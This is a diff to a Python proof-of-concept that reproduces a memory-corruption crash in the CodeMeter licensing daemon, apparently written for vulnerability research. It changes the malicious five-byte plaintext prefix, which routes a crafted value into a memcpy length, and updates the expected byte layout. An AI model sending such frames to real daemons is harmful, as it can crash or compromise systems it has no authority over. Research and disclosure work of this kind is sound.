@@ -9,7 +9,7 @@ the few observed fixed fields needed to match the captured testbench HELLO.
 It sends one valid encrypted SAMC client-to-daemon frame whose decrypted
 plaintext is:
 
-    5e 35 5e d6 f2 || canonical HELLO with a fresh 4-byte client token
+    5e 00 00 00 00 || canonical HELLO with a fresh 4-byte client token
 
 For non-loopback targets, it first completes the ECDH selector exchange and
 sends the same application plaintext under selector 0xa1.
@@ -31,7 +31,9 @@ Protocol layering, as used here:
 
 The bug trigger is not in the ECDH or PSK machinery. Those layers only make the
 daemon accept and decrypt the application plaintext. The reduced trigger is the
-five-byte prefix before the canonical HELLO.
+five-byte prefix before the canonical HELLO; the original captured
+5e355ed6f2 prefix reaches the same shifted layout, but the zero-tail form is
+the simpler default.
 """
 
 from __future__ import annotations
@@ -50,15 +52,17 @@ from cryptography.hazmat.primitives.asymmetric import ec
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 
 
-# This is the reduced mutation from the fuzzing run. It is prepended as raw
-# application plaintext before any padding, CRC, AES, selector, or samc header
-# is applied.
-DEFAULT_PREFIX_HEX = "5e355ed6f2"
+# This is the reduced mutation. It is prepended as raw application plaintext
+# before any padding, CRC, AES, selector, or samc header is applied. The older
+# captured prefix 5e355ed6f2 reaches the same bad length; the ECDH prefix
+# campaign showed the filler bytes can be zeroed.
+DEFAULT_PREFIX_HEX = "5e00000000"
+HISTORICAL_PREFIX_HEX = "5e355ed6f2"
 
 # Expected first 16 plaintext bytes after applying the default prefix to the
 # canonical HELLO. This is a guardrail: if the generated standalone HELLO shape
 # drifts, the reproducer should fail before sending a misleading packet.
-DEFAULT_MUTATED_HELLO_HEAD_HEX = "5e355ed6f20a00000000000010000028"
+DEFAULT_MUTATED_HELLO_HEAD_HEX = "5e000000000a00000000000010000028"
 
 # The shifted little-endian word at application offset 0x0c. Confirmed cores
 # show this value later used as the memcpy length at CodeMeterLin+0x8f431d.
@@ -399,7 +403,7 @@ def validate_default_crash_layout(prefix: bytes, payload: bytes) -> None:
 
     With the default prefix, the first 16 bytes should be:
 
-        5e 35 5e d6 f2 0a 00 00 00 00 00 00 10 00 00 28
+        5e 00 00 00 00 0a 00 00 00 00 00 00 10 00 00 28
 
     Interpreted as little-endian u32 values, the fourth word is 0x28000010.
     That is the value this reproducer is designed to route into the memcpy
